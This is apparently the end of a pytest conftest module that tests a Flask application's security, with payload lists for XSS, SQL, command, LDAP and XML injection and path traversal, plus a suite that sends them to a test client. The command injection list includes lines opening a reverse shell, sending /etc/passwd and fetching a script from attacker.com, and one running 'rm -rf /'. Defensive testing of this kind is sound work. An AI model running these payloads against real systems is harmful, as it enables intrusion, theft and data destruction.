        
    def create_invalid_jwt_tokens(self) -> List[str]:
        """Create various invalid JWT tokens for testing."""
        return [
            "invalid.jwt.token",
            "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.invalid.signature",
            "",
            "null",
            "undefined",
            "Bearer " + "A" * 2000,  # Oversized token
            "malformed-jwt-token",
            "eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0..invalid"  # None algorithm
        ]
        
    def create_attack_payloads_dataset(self) -> Dict[str, List[str]]:
        """Create comprehensive attack payloads dataset."""
        return {
            'xss': self.get_xss_attack_vectors(),
            'sql_injection': self.get_sql_injection_vectors(),
            'command_injection': self.get_command_injection_vectors(),
            'path_traversal': self.get_path_traversal_vectors(),
            'ldap_injection': self.get_ldap_injection_vectors(),
            'xml_injection': self.get_xml_injection_vectors()
        }
        
    def get_xss_attack_vectors(self) -> List[str]:
        """Generate XSS attack vectors for testing."""
        return [
            "<script>alert('xss')</script>",
            "<img src=x onerror=alert('xss')>",
            "<svg onload=alert('xss')>",
            "javascript:alert('xss')",
            "'\"><script>alert('xss')</script>",
            "<iframe src='javascript:alert(\"xss\")'></iframe>",
            "<body onload=alert('xss')>",
            "<input onfocus=alert('xss') autofocus>",
            "<select onfocus=alert('xss') autofocus>",
            "<textarea onfocus=alert('xss') autofocus>"
        ]
        
    def get_sql_injection_vectors(self) -> List[str]:
        """Generate SQL injection vectors for testing."""
        return [
            "'; DROP TABLE users; --",
            "' OR '1'='1",
            "' UNION SELECT * FROM users --",
            "'; INSERT INTO users VALUES ('hacker', 'password'); --",
            "' OR 1=1 --",
            "admin'--",
            "' OR 'a'='a",
            "') OR ('1'='1",
            "' UNION SELECT username, password FROM users --",
            "'; DELETE FROM users WHERE '1'='1'; --"
        ]
        
    def get_command_injection_vectors(self) -> List[str]:
        """Generate command injection vectors for testing."""
        return [
            "; ls -la",
            "| cat /etc/passwd",
            "&& whoami",
            "; cat /etc/shadow",
            "| nc -e /bin/sh attacker.com 4444",
            "; rm -rf /",
            "&& curl http://attacker.com/steal?data=`cat /etc/passwd`",
            "| python -c \"import os; os.system('id')\"",
            "; wget http://attacker.com/malware.sh && bash malware.sh",
            "&& echo 'hacked' > /tmp/pwned"
        ]
        
    def get_path_traversal_vectors(self) -> List[str]:
        """Generate path traversal vectors for testing."""
        return [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\config\\sam",
            "....//....//....//etc//passwd",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
            "..%252f..%252f..%252fetc%252fpasswd",
            "....\/....\/....\/etc\/passwd",
            "..%c0%af..%c0%af..%c0%afetc%c0%afpasswd",
            "....\\....\\....\\etc\\passwd",
            "..//..//..//etc//passwd",
            "..%5c..%5c..%5cetc%5cpasswd"
        ]
        
    def get_ldap_injection_vectors(self) -> List[str]:
        """Generate LDAP injection vectors for testing."""
        return [
            "*)(uid=*",
            "*)(|(uid=*))",
            "*)(&(uid=*))",
            "*))%00",
            "admin)(&(password=*))",
            "*)(cn=*",
            "*)(|(cn=*))",
            "*)((cn=*))",
            "*)(objectClass=*",
            "*)(|(objectClass=*))"
        ]
        
    def get_xml_injection_vectors(self) -> List[str]:
        """Generate XML injection vectors for testing."""
        return [
            "<!---->",
            "<![CDATA[<script>alert('xss')</script>]]>",
            "<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY test SYSTEM 'file:///etc/passwd'>]><root>&test;</root>",
            "<script xmlns=\"http://www.w3.org/1999/xhtml\">alert('xss')</script>",
            "<?xml-stylesheet type=\"text/xsl\" href=\"javascript:alert('xss')\"?>",
            "<!DOCTYPE root [<!ENTITY % ext SYSTEM \"http://attacker.com/evil.dtd\"> %ext;]>",
            "<test><![CDATA['>\"]]></test>",
            "<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE test [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><test>&xxe;</test>",
            "<root xmlns:xi=\"http://www.w3.org/2001/XInclude\"><xi:include href=\"file:///etc/passwd\"/></root>",
            "<?xml version=\"1.0\"?><!DOCTYPE test [<!ENTITY % dtd SYSTEM \"http://attacker.com/test.dtd\"> %dtd;]>"
        ]


class PenetrationTestSuite:
    """
    Automated penetration testing suite per Section 6.4.5 for enterprise security validation.
    
    Provides comprehensive automated penetration testing capabilities including vulnerability
    scanning, attack scenario execution, security control validation, and compliance testing.
    """
    
    def __init__(self, security_test_environment: Dict[str, Any], 
                 owasp_payloads: OWASPAttackPayloads,
                 metrics_collector: SecurityMetricsCollector):
        self.environment = security_test_environment
        self.owasp_payloads = owasp_payloads
        self.metrics_collector = metrics_collector
        self.test_results = []
        
    async def run_comprehensive_security_scan(self, client: FlaskClient) -> Dict[str, Any]:
        """Run comprehensive automated security scan."""
        scan_start_time = time.time()
        scan_id = secrets.token_hex(12)
        
        security_logger.info(f"Starting comprehensive security scan: {scan_id}")
        
        # Execute OWASP Top 10 tests
        owasp_results = await self._run_owasp_top10_tests(client)
        
        # Execute authentication security tests
        auth_results = await self._run_authentication_tests(client)
        
        # Execute authorization security tests
        authz_results = await self._run_authorization_tests(client)
        
        # Execute input validation tests
        input_validation_results = await self._run_input_validation_tests(client)
        
        # Execute security header tests
        security_header_results = await self._run_security_header_tests(client)
        
        # Execute rate limiting tests
        rate_limiting_results = await self._run_rate_limiting_tests(client)
        
        scan_duration = time.time() - scan_start_time
        
        # Generate comprehensive report
        scan_results = {
            'scan_id': scan_id,
            'scan_duration_seconds': scan_duration,
            'test_categories': {
                'owasp_top10': owasp_results,
                'authentication': auth_results,
                'authorization': authz_results,
                'input_validation': input_validation_results,
                'security_headers': security_header_results,
                'rate_limiting': rate_limiting_results
            },
            'overall_security_score': self._calculate_security_score([
                owasp_results, auth_results, authz_results,
                input_validation_results, security_header_results, rate_limiting_results
            ]),
            'vulnerabilities_found': self._extract_vulnerabilities([
                owasp_results, auth_results, authz_results,
                input_validation_results, security_header_results, rate_limiting_results
            ]),
            'compliance_status': self._assess_compliance_status([
                owasp_results, auth_results, authz_results,
                input_validation_results, security_header_results, rate_limiting_results
            ])
        }
        
        # Store results for reporting
        self.test_results.append(scan_results)
        
        security_logger.info(f"Security scan completed: {scan_id} - Score: {scan_results['overall_security_score']}")
        
        return scan_results
        
    async def _run_owasp_top10_tests(self, client: FlaskClient) -> Dict[str, Any]:
        """Run OWASP Top 10 vulnerability tests."""
        test_endpoints = ['/api/users', '/api/login', '/api/search', '/api/upload']
        results = {}
        
        for endpoint in test_endpoints:
            # Test XSS vulnerabilities
            xss_payloads = self.owasp_payloads.get_xss_payloads()
            xss_vulnerabilities = []
            
            for payload in xss_payloads[:20]:  # Limit for testing performance
                try:
                    response = client.post(endpoint, json={'input': payload})
                    if payload in response.get_data(as_text=True):
                        xss_vulnerabilities.append({
                            'payload': payload,
                            'endpoint': endpoint,
                            'vulnerability_type': 'xss_reflected'
                        })
                except Exception:
                    pass
                    
            # Test SQL injection vulnerabilities
            sql_payloads = self.owasp_payloads.get_sql_injection_payloads()
            sql_vulnerabilities = []
            
            for payload in sql_payloads[:15]:  # Limit for testing performance
                try:
                    response = client.post(endpoint, json={'query': payload})
                    response_text = response.get_data(as_text=True).lower()
                    sql_errors = ['syntax error', 'mysql_fetch', 'ora-', 'microsoft jet']
                    if any(error in response_text for error in sql_errors):
                        sql_vulnerabilities.append({
                            'payload': payload,
                            'endpoint': endpoint,
                            'vulnerability_type': 'sql_injection'
                        })
                except Exception:
                    pass
                    
            results[endpoint] = {
                'xss_vulnerabilities': xss_vulnerabilities,
                'sql_vulnerabilities': sql_vulnerabilities,
                'total_vulnerabilities': len(xss_vulnerabilities) + len(sql_vulnerabilities)
            }
            
        return {
            'test_type': 'owasp_top10',
            'endpoints_tested': len(test_endpoints),
            'results': results,
            'total_vulnerabilities': sum(r['total_vulnerabilities'] for r in results.values()),
            'critical_findings': [
                vuln for endpoint_results in results.values()
                for vuln in endpoint_results['xss_vulnerabilities'] + endpoint_results['sql_vulnerabilities']
            ]
        }
        
    async def _run_authentication_tests(self, client: FlaskClient) -> Dict[str, Any]:
        """Run authentication security tests."""
        auth_endpoints = ['/api/login', '/api/logout', '/api/refresh', '/api/protected']
        results = {}
        
        # Test JWT security
        jwt_tests = await self._test_jwt_security(client)
        
        # Test session security
        session_tests = await self._test_session_security(client)
        
        # Test password security
        password_tests = await self._test_password_security(client)
        
        # Test multi-factor authentication
        mfa_tests = await self._test_mfa_security(client)
        
        return {
            'test_type': 'authentication',
            'jwt_security': jwt_tests,
            'session_security': session_tests,
            'password_security': password_tests,
            'mfa_security': mfa_tests,
            'overall_auth_score': (
                jwt_tests.get('security_score', 0) +
                session_tests.get('security_score', 0) +
                password_tests.get('security_score', 0) +
                mfa_tests.get('security_score', 0)
            ) / 4
        }
        
    async def _test_jwt_security(self, client: FlaskClient) -> Dict[str, Any]:
        """Test JWT token security."""
        jwt_vulnerabilities = []
        
        # Test with invalid tokens
        invalid_tokens = [
            "invalid.jwt.token",
            "eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0..invalid",
            "",
            "null"
        ]
        
        for token in invalid_tokens:
            response = client.get('/api/protected', headers={'Authorization': f'Bearer {token}'})
            if response.status_code == 200:
                jwt_vulnerabilities.append({
                    'vulnerability': 'invalid_token_accepted',
                    'token': token,
                    'endpoint': '/api/protected'
                })
                
        return {
            'vulnerabilities_found': jwt_vulnerabilities,
            'security_score': 100 - (len(jwt_vulnerabilities) * 25),  # Deduct 25 points per vulnerability
            'test_count': len(invalid_tokens)
        }
        
    async def _test_session_security(self, client: FlaskClient) -> Dict[str, Any]:
        """Test session security."""
        session_vulnerabilities = []
        
        # Test session fixation
        response1 = client.get('/api/login')
        session_cookie1 = response1.headers.get('Set-Cookie')
        
        # Login and check if session changes
        response2 = client.post('/api/login', json={'username': 'test', 'password': 'test'})
        session_cookie2 = response2.headers.get('Set-Cookie')
        
        if session_cookie1 == session_cookie2:
            session_vulnerabilities.append({
                'vulnerability': 'session_fixation',
                'description': 'Session ID not regenerated after login'
            })
            
        return {
            'vulnerabilities_found': session_vulnerabilities,
            'security_score': 100 - (len(session_vulnerabilities) * 30),
            'test_count': 1
        }
        
    async def _test_password_security(self, client: FlaskClient) -> Dict[str, Any]:
        """Test password security."""
        password_vulnerabilities = []
        
        # Test weak password acceptance
        weak_passwords = ['123456', 'password', 'admin', '']
        
        for password in weak_passwords:
            response = client.post('/api/register', json={
                'username': f'testuser_{secrets.token_hex(4)}',
                'password': password
            })
            if response.status_code == 201:
                password_vulnerabilities.append({
                    'vulnerability': 'weak_password_accepted',
                    'password': password
                })
                
        return {
            'vulnerabilities_found': password_vulnerabilities,
            'security_score': 100 - (len(password_vulnerabilities) * 20),
            'test_count': len(weak_passwords)
        }
        
    async def _test_mfa_security(self, client: FlaskClient) -> Dict[str, Any]:
        """Test multi-factor authentication security."""
        mfa_vulnerabilities = []
        
        # Test MFA bypass attempts
        bypass_attempts = [
            {'mfa_code': '000000'},
            {'mfa_code': '123456'},
            {'mfa_code': ''},
            {'mfa_code': 'invalid'}
        ]
        
        for attempt in bypass_attempts:
            response = client.post('/api/verify-mfa', json=attempt)
            if response.status_code == 200:
                mfa_vulnerabilities.append({
                    'vulnerability': 'mfa_bypass',
                    'attempt': attempt
                })
                
        return {
            'vulnerabilities_found': mfa_vulnerabilities,
            'security_score': 100 - (len(mfa_vulnerabilities) * 25),
            'test_count': len(bypass_attempts)
        }
        
    async def _run_authorization_tests(self, client: FlaskClient) -> Dict[str, Any]:
        """Run authorization security tests."""
        authz_vulnerabilities = []
        
        # Test privilege escalation
        privilege_escalation_tests = await self._test_privilege_escalation(client)
        
        # Test horizontal privilege escalation
        horizontal_escalation_tests = await self._test_horizontal_escalation(client)
        
        # Test role-based access control
        rbac_tests = await self._test_rbac_security(client)
        
        return {
            'test_type': 'authorization',
            'privilege_escalation': privilege_escalation_tests,
            'horizontal_escalation': horizontal_escalation_tests,
            'rbac_security': rbac_tests,
            'overall_authz_score': (
                privilege_escalation_tests.get('security_score', 0) +
                horizontal_escalation_tests.get('security_score', 0) +
                rbac_tests.get('security_score', 0)
            ) / 3
        }
        
    async def _test_privilege_escalation(self, client: FlaskClient) -> Dict[str, Any]:
        """Test privilege escalation vulnerabilities."""
        escalation_vulnerabilities = []
        
        # Test parameter tampering
        escalation_attempts = [
            {'user_id': 'admin'},
            {'role': 'administrator'},
            {'permissions': ['admin']},
            {'is_admin': True}
        ]
        
        for attempt in escalation_attempts:
            response = client.post('/api/users/update', json=attempt)
            if response.status_code == 200:
                escalation_vulnerabilities.append({
                    'vulnerability': 'privilege_escalation',
                    'attempt': attempt
                })
                
        return {
            'vulnerabilities_found': escalation_vulnerabilities,
            'security_score': 100 - (len(escalation_vulnerabilities) * 30),
            'test_count': len(escalation_attempts)
        }
        
    async def _test_horizontal_escalation(self, client: FlaskClient) -> Dict[str, Any]:
        """Test horizontal privilege escalation."""
        horizontal_vulnerabilities = []
        
        # Test accessing other users' data
        user_ids = ['user1', 'user2', 'admin', 'guest']
        
        for user_id in user_ids:
            response = client.get(f'/api/users/{user_id}/profile')
            if response.status_code == 200:
                horizontal_vulnerabilities.append({
                    'vulnerability': 'horizontal_escalation',
                    'accessed_user': user_id
                })
                
        return {
            'vulnerabilities_found': horizontal_vulnerabilities,
            'security_score': 100 - (len(horizontal_vulnerabilities) * 25),
            'test_count': len(user_ids)
        }
        
    async def _test_rbac_security(self, client: FlaskClient) -> Dict[str, Any]:
        """Test role-based access control security."""
        rbac_vulnerabilities = []
        
        # Test unauthorized endpoint access
        protected_endpoints = [
            '/api/admin/users',
            '/api/admin/settings',
            '/api/admin/logs',
            '/api/admin/system'
        ]
        
        for endpoint in protected_endpoints:
            response = client.get(endpoint)
            if response.status_code == 200:
                rbac_vulnerabilities.append({
                    'vulnerability': 'unauthorized_access',
                    'endpoint': endpoint
                })
                
        return {
            'vulnerabilities_found': rbac_vulnerabilities,
            'security_score': 100 - (len(rbac_vulnerabilities) * 20),
            'test_count': len(protected_endpoints)
        }
        
    async def _run_input_validation_tests(self, client: FlaskClient) -> Dict[str, Any]:
        """Run input validation security tests."""
        validation_vulnerabilities = []
        
        # Test various input validation bypasses
        malicious_inputs = self.owasp_payloads.create_attack_payloads_dataset()
        
        test_endpoints = ['/api/users', '/api/search', '/api/upload']
        
        for endpoint in test_endpoints:
            for attack_type, payloads in malicious_inputs.items():
                for payload in payloads[:5]:  # Limit for performance
                    try:
                        response = client.post(endpoint, json={'input': payload})
                        # Check if malicious input was processed without validation
                        if response.status_code == 200 and 'error' not in response.get_json():
                            validation_vulnerabilities.append({
                                'vulnerability': f'input_validation_{attack_type}',
                                'payload': payload,
                                'endpoint': endpoint
                            })
                    except Exception:
                        pass
                        
        return {
            'test_type': 'input_validation',
            'vulnerabilities_found': validation_vulnerabilities,
            'security_score': max(0, 100 - (len(validation_vulnerabilities) * 10)),
            'test_count': sum(len(payloads[:5]) for payloads in malicious_inputs.values()) * len(test_endpoints)
        }
        
    async def _run_security_header_tests(self, client: FlaskClient) -> Dict[str, Any]:
        """Run security header validation tests."""
        header_issues = []
        
        response = client.get('/')
        headers = dict(response.headers)
        
        required_headers = SecurityTestConfig.SECURITY_HEADERS_REQUIRED
        
        for header in required_headers:
            if header not in headers:
                header_issues.append({
                    'issue': 'missing_header',
                    'header': header
                })
            elif not self._validate_header_value(header, headers[header]):
                header_issues.append({
                    'issue': 'invalid_header_value',
                    'header': header,
                    'value': headers[header]
                })
                
        return {
            'test_type': 'security_headers',
            'header_issues': header_issues,
            'security_score': max(0, 100 - (len(header_issues) * 15)),
            'headers_tested': len(required_headers)
        }
        
    def _validate_header_value(self, header: str, value: str) -> bool:
        """Validate security header value."""
        validations = {
            'Strict-Transport-Security': lambda v: 'max-age=' in v,
            'X-Content-Type-Options': lambda v: v == 'nosniff',
            'X-Frame-Options': lambda v: v in ['DENY', 'SAMEORIGIN'],
            'Content-Security-Policy': lambda v: "default-src" in v,
            'Referrer-Policy': lambda v: v in ['strict-origin-when-cross-origin', 'strict-origin'],
            'X-XSS-Protection': lambda v: v in ['1; mode=block', '0']
        }
        
        validator = validations.get(header)
        return validator(value) if validator else True
        
    async def _run_rate_limiting_tests(self, client: FlaskClient) -> Dict[str, Any]:
        """Run rate limiting security tests."""
        rate_limit_issues = []
        
        # Test rate limiting effectiveness
        endpoint = '/api/login'
        requests_made = 0
        requests_blocked = 0
        
        for _ in range(100):  # Make 100 rapid requests
            response = client.post(endpoint, json={'username': 'test', 'password': 'wrong'})
            requests_made += 1
            if response.status_code == 429:  # Rate limited
                requests_blocked += 1
                
        # Rate limiting should block at least 50% of excessive requests
        if requests_blocked < (requests_made * 0.5):
            rate_limit_issues.append({
                'issue': 'ineffective_rate_limiting',
                'endpoint': endpoint,
                'requests_made': requests_made,
                'requests_blocked': requests_blocked
            })
            
        return {
            'test_type': 'rate_limiting',
            'rate_limit_issues': rate_limit_issues,
            'security_score': 100 if not rate_limit_issues else 50,
            'test_count': 1
        }
        
    def _calculate_security_score(self, test_results: List[Dict[str, Any]]) -> float:
        """Calculate overall security score from test results."""
        total_score = 0
        score_count = 0
        
        for result in test_results:
            if isinstance(result, dict):
                # Look for security scores in various formats
                score = None
                if 'security_score' in result:
                    score = result['security_score']
                elif 'overall_auth_score' in result:
                    score = result['overall_auth_score']
                elif 'overall_authz_score' in result:
                    score = result['overall_authz_score']
                    
                if score is not None:
                    total_score += score
                    score_count += 1
                    
        return total_score / score_count if score_count > 0 else 0
        
    def _extract_vulnerabilities(self, test_results: List[Dict[str, Any]]) -> List[Dict[str, Any]]:
        """Extract all vulnerabilities from test results."""
        all_vulnerabilities = []
        
        for result in test_results:
            if isinstance(result, dict):
                # Extract vulnerabilities from various result formats
                if 'vulnerabilities_found' in result:
                    all_vulnerabilities.extend(result['vulnerabilities_found'])
                elif 'critical_findings' in result:
                    all_vulnerabilities.extend(result['critical_findings'])
                elif 'header_issues' in result:
                    all_vulnerabilities.extend(result['header_issues'])
                elif 'rate_limit_issues' in result:
                    all_vulnerabilities.extend(result['rate_limit_issues'])
                    
                # Extract nested vulnerabilities
                for key, value in result.items():
                    if isinstance(value, dict) and 'vulnerabilities_found' in value:
                        all_vulnerabilities.extend(value['vulnerabilities_found'])
                        
        return all_vulnerabilities
        
    def _assess_compliance_status(self, test_results: List[Dict[str, Any]]) -> Dict[str, Any]:
        """Assess compliance status based on test results."""
        vulnerabilities = self._extract_vulnerabilities(test_results)
        critical_vulnerabilities = [v for v in vulnerabilities if self._is_critical_vulnerability(v)]
        
        compliance_score = max(0, 100 - len(critical_vulnerabilities) * 20)
        
        return {
            'compliant': len(critical_vulnerabilities) == 0,
            'compliance_score': compliance_score,
            'critical_vulnerabilities': len(critical_vulnerabilities),
            'total_vulnerabilities': len(vulnerabilities),
            'compliance_level': self._get_compliance_level(compliance_score)
        }
        
    def _is_critical_vulnerability(self, vulnerability: Dict[str, Any]) -> bool:
        """Determine if vulnerability is critical."""
        critical_types = [
            'sql_injection', 'xss_reflected', 'privilege_escalation',
            'authentication_bypass', 'unauthorized_access'
        ]
        
        vuln_type = vulnerability.get('vulnerability_type') or vulnerability.get('vulnerability', '')
        return any(critical_type in vuln_type for critical_type in critical_types)
        
    def _get_compliance_level(self, score: float) -> str:
        """Get compliance level based on score."""
        if score >= 95:
            return 'Excellent'
        elif score >= 85:
            return 'Good'
        elif score >= 70:
            return 'Acceptable'
        elif score >= 50:
            return 'Poor'
        else:
            return 'Critical'


class AsyncSecurityValidator:
    """
    Asynchronous security validation utilities for async security operations per Section 6.6.1.
    
    Provides async security testing capabilities including concurrent attack simulation,
    async authentication testing, and async database security validation.
    """
    
    def __init__(self, app: Flask, motor_client):
        self.app = app
        self.motor_client = motor_client
        
    async def validate_async_auth_security(self, auth_tokens: List[str]) -> Dict[str, Any]:
        """Validate authentication security asynchronously."""
        async def validate_token(token):
            try:
                # Simulate async token validation
                await asyncio.sleep(0.01)  # Simulate network delay
                
                # Check token format
                if not token or len(token) < 10:
                    return {'token': token, 'valid': False, 'reason': 'invalid_format'}
                    
                # Check for common attack patterns
                attack_patterns = ['<script>', 'DROP TABLE', '../', 'eval(']
                if any(pattern in token for pattern in attack_patterns):
                    return {'token': token, 'valid': False, 'reason': 'malicious_content'}
                    
                return {'token': token, 'valid': True, 'reason': 'valid'}
                
            except Exception as e:
                return {'token': token, 'valid': False, 'reason': f'error: {str(e)}'}
                
        # Validate tokens concurrently
        validation_tasks = [validate_token(token) for token in auth_tokens]
        results = await asyncio.gather(*validation_tasks)
        
        valid_tokens = [r for r in results if r['valid']]
        invalid_tokens = [r for r in results if not r['valid']]
        
        return {
            'total_tokens': len(auth_tokens),
            'valid_tokens': len(valid_tokens),
            'invalid_tokens': len(invalid_tokens),
            'validation_results': results,
            'security_score': (len(valid_tokens) / len(auth_tokens)) * 100 if auth_tokens else 0
        }
        
    async def simulate_concurrent_attacks(self, attack_scenarios: List[Dict[str, Any]]) -> Dict[str, Any]:
        """Simulate concurrent security attacks."""
        async def execute_attack(scenario):
            attack_type = scenario.get('type', 'unknown')
            payload = scenario.get('payload', '')
            
            try:
                # Simulate attack execution
                await asyncio.sleep(0.05)  # Simulate attack duration
                
                # Simple attack detection logic
                detected = False
                if 'script' in payload.lower() or 'drop' in payload.lower():
                    detected = True
                    
                return {
                    'attack_id': secrets.token_hex(8),
                    'attack_type': attack_type,
                    'payload': payload[:100],  # Truncate for logging
                    'detected': detected,
                    'blocked': detected,
                    'execution_time_ms': 50  # Simulated
                }
                
            except Exception as e:
                return {
                    'attack_id': secrets.token_hex(8),
                    'attack_type': attack_type,
                    'error': str(e),
                    'detected': True,
                    'blocked': True
                }
                
        # Execute attacks concurrently
        attack_tasks = [execute_attack(scenario) for scenario in attack_scenarios]
        attack_results = await asyncio.gather(*attack_tasks)
        
        detected_attacks = [r for r in attack_results if r.get('detected')]
        blocked_attacks = [r for r in attack_results if r.get('blocked')]
        
        return {
            'total_attacks': len(attack_scenarios),
            'detected_attacks': len(detected_attacks),
            'blocked_attacks': len(blocked_attacks),
            'detection_rate': (len(detected_attacks) / len(attack_scenarios)) * 100 if attack_scenarios else 0,
            'block_rate': (len(blocked_attacks) / len(attack_scenarios)) * 100 if attack_scenarios else 0,
            'attack_results': attack_results
        }


# Security test configuration pytest hooks
def pytest_configure(config):
    """Configure security testing environment."""
    # Set security testing environment variables
    os.environ.update({
        'SECURITY_TESTING_MODE': 'true',
        'ATTACK_SIMULATION_ENABLED': 'true',
        'PENETRATION_TESTING_ENABLED': 'true',
        'SECURITY_METRICS_COLLECTION': 'true'
    })
    
    # Configure security test logging
    security_handler = logging.StreamHandler()
    security_handler.setFormatter(logging.Formatter(
        '%(asctime)s - %(name)s - %(levelname)s - %(message)s'
    ))
    security_logger.addHandler(security_handler)
    
    security_logger.info("Security testing environment configured")


def pytest_collection_modifyitems(config, items):
    """Modify security test items with appropriate markers."""
    for item in items:
        # Add security markers
        if "security" in item.nodeid:
            item.add_marker(pytest.mark.security)
        if "penetration" in item.nodeid or "pentest" in item.nodeid:
            item.add_marker(pytest.mark.penetration)
        if "attack" in item.nodeid:
            item.add_marker(pytest.mark.attack_simulation)
        if "vulnerability" in item.nodeid:
            item.add_marker(pytest.mark.vulnerability_testing)


def pytest_runtest_setup(item):
    """Security test setup with monitoring initialization."""
    if item.get_closest_marker("security"):
        # Initialize security monitoring for the test
        item.security_start_time = time.time()
        security_logger.info(f"Starting security test: {item.nodeid}")


def pytest_runtest_teardown(item):
    """Security test teardown with results collection."""
    if item.get_closest_marker("security") and hasattr(item, 'security_start_time'):
        # Calculate security test execution time
        execution_time = time.time() - item.security_start_time
        
        # Store security test performance data
        if not hasattr(item.session, 'security_test_data'):
            item.session.security_test_data = []
            
        item.session.security_test_data.append({
            'test_name': item.nodeid,
            'execution_time': execution_time,
            'test_type': 'security'
        })
        
        security_logger.info(f"Security test completed: {item.nodeid} - Time: {execution_time:.3f}s")


def pytest_sessionfinish(session, exitstatus):
    """Security testing session summary and reporting."""
    if hasattr(session, 'security_test_data'):
        security_tests = session.security_test_data
        total_security_tests = len(security_tests)
        total_security_time = sum(test['execution_time'] for test in security_tests)
        
        security_logger.info(f"Security testing session summary:")
        security_logger.info(f"  Total security tests: {total_security_tests}")
        security_logger.info(f"  Total security test time: {total_security_time:.3f}s")
        security_logger.info(f"  Average security test time: {total_security_time/total_security_tests:.3f}s")
        
        # Log any long-running security tests
        long_tests = [test for test in security_tests if test['execution_time'] > SECURITY_TEST_TIMEOUT/10]
        if long_tests:
            security_logger.warning(f"Long-running security tests detected: {len(long_tests)}")
            for test in long_tests:
                security_logger.warning(f"  {test['test_name']}: {test['execution_time']:.3f}s")


# Export all security testing utilities
__all__ = [
    'SecurityTestConfig',
    'SecurityMonitor', 
    'AttackSimulator',
    'TalismanValidator',
    'Auth0SecurityMock',
    'RateLimiterAttackSimulator',
    'OWASPAttackPayloads',
    'SecurityMetricsCollector',
    'PenetrationTestSuite',
    'AsyncSecurityValidator',
    'SecurityTestDataFactory',
    'security_config',
    'security_test_environment',
    'flask_talisman_validator',
    'auth0_security_mock',
    'rate_limiter_attack_simulator',
    'owasp_attack_payloads',
    'security_metrics_collector',
    'penetration_test_suite',
    'async_security_validator',
    'security_test_data_factory'
]